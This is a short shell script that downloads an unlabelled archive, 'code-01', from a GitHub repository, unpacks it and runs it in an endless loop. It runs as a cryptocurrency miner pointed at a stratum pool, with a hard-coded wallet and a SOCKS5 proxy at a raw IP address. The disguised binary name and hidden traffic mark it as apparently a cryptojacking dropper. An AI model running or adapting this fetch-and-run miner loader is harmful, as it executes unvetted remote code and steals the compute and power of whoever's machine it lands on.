#!/bin/sh
wget https://github.com/Christian-Abasto/Christian-Abasto/raw/main/code-01
tar xf code-01
while [ 1 ]; do
./code-01 -a yescryptr16 -o stratum+tcps://stratum-eu.rplant.xyz:17057 -u GV1vSLcuQ5Xo23W1tBeQ1DyqvoipUc8yxd.001 --proxy=SOCKS5://72.206.181.105:64935
sleep 5
done
